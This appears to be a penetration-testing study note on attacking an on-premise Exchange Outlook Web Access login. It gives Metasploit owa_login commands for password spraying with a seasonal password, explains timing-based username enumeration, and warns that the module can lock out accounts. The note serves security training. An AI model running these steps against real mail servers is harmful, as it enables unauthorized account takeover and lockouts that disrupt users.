**Outlook Web Access** is the on-premise **Exchange Mail server.** It is possible to pull quite a bit of information from the organization even if we don't fully break into it

![](https://pnpt.adot8.com/~gitbook/image?url=https%3A%2F%2F152155081-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUczSr73L34emqNMDOxDg%252Fuploads%252FoXESMe4uZJoEQx2q7IxP%252Fimage.png%3Falt%3Dmedia%26token%3D96516e54-dc51-4b7a-811b-5e895f94b607&width=768&dpr=4&quality=100&sign=54744f4d&sv=2)

### Metasploit
```bash
use auxiliary/scanner/http/owa_login
set user_file users.txt
set password Winter24!
```

You might need to change the Auxiliary Action to the appropriate version
```bash
set action OWA_2016
```

If the account is valid the server will get back to you faster than if the account is invalid. Metasploit has a builtin detection mechanism for this and saves the valid user accounts
![[Pasted image 20250222153019.png]]

> [!NOTE] Note
> Metasploit won't stop if you continuously lock out accounts althought it will tell you if an account is locked out. Be sure to monitor it

Successful login
![[Pasted image 20250222153101.png]]
